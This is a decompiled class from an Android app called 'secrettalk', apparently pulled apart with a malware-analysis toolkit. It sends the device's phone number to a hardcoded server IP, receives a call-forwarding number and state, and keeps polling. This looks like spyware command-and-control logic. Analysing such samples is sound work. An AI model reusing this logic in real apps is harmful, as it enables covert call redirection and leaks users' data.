package com.android.secrettalk;

import android.os.AsyncTask;
import android.os.Handler;
import com.google.gson.JsonObject;
import java.net.URI;
import org.json.JSONException;
import org.json.JSONObject;

class ReceiverRegisterService$4
  extends AsyncTask<Void, Void, Void>
{
  ReceiverRegisterService$4(ReceiverRegisterService paramReceiverRegisterService) {}
  
  protected Void doInBackground(Void... paramVarArgs)
  {
    JsonObject localJsonObject = new JsonObject();
    localJsonObject.addProperty("phone_id", GlobalData.my_phonenumber);
    String str1 = HttpManager.postHttpResponse(URI.create("http://61.33.28.196/secrettalk.server/api/api.php?mName=callForwardingInformation&format=json"), localJsonObject.toString());
    try
    {
      JSONObject localJSONObject = new JSONObject(str1);
      ReceiverRegisterService localReceiverRegisterService1 = this.this$0;
      String str2;
      ReceiverRegisterService localReceiverRegisterService2;
      if (localJSONObject.has("call_forwarding_phone"))
      {
        str2 = localJSONObject.getString("call_forwarding_phone");
        localReceiverRegisterService1.call_forwarding_phone = str2;
        localReceiverRegisterService2 = this.this$0;
        if (!localJSONObject.has("call_forward_state")) {
          break label134;
        }
      }
      label134:
      for (int i = localJSONObject.getInt("call_forward_state");; i = 0)
      {
        localReceiverRegisterService2.call_forward_state = i;
        ReceiverRegisterService.access$1(this.this$0).sendEmptyMessage(4000);
        this.this$0.pollingNext();
        return null;
        str2 = "";
        break;
      }
    }
    catch (JSONException localJSONException)
    {
      for (;;)
      {
        localJSONException.printStackTrace();
      }
    }
  }
}


/* Location:           D:\ManalProject\Manal\Manal-plugin\tools\decompiler\tools\classes-dex2jar.jar
 * Qualified Name:     com.android.secrettalk.ReceiverRegisterService.4
 * JD-Core Version:    0.7.0.1
 */